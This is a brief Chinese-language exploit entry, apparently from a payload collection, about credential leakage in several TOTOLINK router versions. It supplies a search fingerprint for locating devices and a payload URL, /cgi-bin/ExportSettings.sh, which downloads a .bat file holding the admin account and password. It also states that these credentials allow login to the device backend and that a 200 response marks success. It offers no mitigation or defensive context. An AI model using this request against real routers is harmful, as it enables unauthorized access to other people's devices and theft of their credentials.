# TOTOLINK多个版本存在泄漏账号密码

TOTOLINK ｜ 其他 ｜ —
- **指纹**：`"TOTOLINK"`

**Payload**
```
[http://ip/cgi-bin/ExportSettings.sh](http://ip/cgi-bin/ExportSettings.sh)
访问会下载一个xxxx.bat文件里面泄漏账号密码，可登录后台
```
- **响应特征**：200